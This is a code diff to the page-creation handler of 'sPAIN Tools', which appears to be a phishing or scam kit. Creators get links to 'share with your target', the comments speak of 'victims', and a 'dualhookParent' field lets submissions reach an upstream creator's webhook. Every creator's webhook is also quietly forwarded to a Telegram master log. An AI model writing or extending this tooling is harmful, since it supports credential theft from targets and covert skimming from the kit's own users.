@@ -13,8 +13,6 @@ async function redisGet(key) {
 }
 
 async function redisSet(key, value) {
-  // Encode value in URL path — the most reliable format for Upstash REST API.
-  // This stores a raw JSON string that page.js can JSON.parse back into an object.
   const res = await fetch(
     `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
     { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
@@ -32,7 +30,6 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-// Send the generated link to the creator's own Discord webhook
 async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
   if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
   try {
@@ -46,9 +43,9 @@ async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
           description: `Your page has been created successfully.\n\n**Share this link with your target:**\n${url}`,
           color: type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
           fields: [
-            { name: '📁 Slug', value: `\`${slug}\``, inline: true },
-            { name: '🏷 Display Name', value: displayName, inline: true },
-            { name: '🔗 Your Link', value: url, inline: false }
+            { name: '📁 Slug',         value: `\`${slug}\``,  inline: true },
+            { name: '🏷 Display Name', value: displayName,    inline: true },
+            { name: '🔗 Your Link',    value: url,            inline: false }
           ],
           footer: { text: 'sPAIN Tools — Keep this webhook private!' },
           timestamp: new Date().toISOString()
@@ -71,7 +68,9 @@ export default async function handler(req, res) {
     try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
   }
 
-  const { name, displayName, webhook, inviteUrl, charUrl, type } = body || {};
+  // dualhookParent is set when the victim generates a slots page FROM a dualhook page.
+  // It holds the slug of the dualhook creator's page so submit.js can find webhook1.
+  const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};
 
   if (!name)    return res.status(400).json({ error: 'name is required' });
   if (!webhook) return res.status(400).json({ error: 'webhook is required' });
@@ -95,12 +94,13 @@ export default async function handler(req, res) {
 
     const record = {
       slug,
-      displayName: displayName || slug,
-      webhook,
-      inviteUrl:  inviteUrl  || '',
-      charUrl:    charUrl    || '',
-      type:       type === 'dualhook' ? 'dualhook' : 'slots',
-      createdAt:  new Date().toISOString()
+      displayName:    displayName    || slug,
+      webhook,                              // webhook2 for child slots, webhook1 for dualhook
+      inviteUrl:      inviteUrl      || '',
+      charUrl:        charUrl        || '',
+      type:           type === 'dualhook' ? 'dualhook' : 'slots',
+      dualhookParent: dualhookParent || null, // null for plain slots & dualhook roots
+      createdAt:      new Date().toISOString()
     };
 
     const ok = await redisSet(`slot:${slug}`, record);
@@ -108,17 +108,16 @@ export default async function handler(req, res) {
 
     const url = `https://spain-tools.vercel.app/${slug}`;
 
-    // 1. Send generated link to creator's Discord webhook
     await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);
 
-    // 2. Telegram master log
     const tgMsg = [
       `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page claimed!</b>`,
       `📁 Slug: <code>${slug}</code>`,
       `🏷 Display: ${record.displayName}`,
       `🔗 URL: ${url}`,
       `📡 Webhook: <code>${webhook}</code>`,
-      inviteUrl ? `💬 Invite: ${inviteUrl}` : '',
+      inviteUrl      ? `💬 Invite: ${inviteUrl}` : '',
+      dualhookParent ? `🔗 DH Parent: <code>${dualhookParent}</code>` : '',
       `🕐 ${record.createdAt}`
     ].filter(Boolean).join('\n');
 
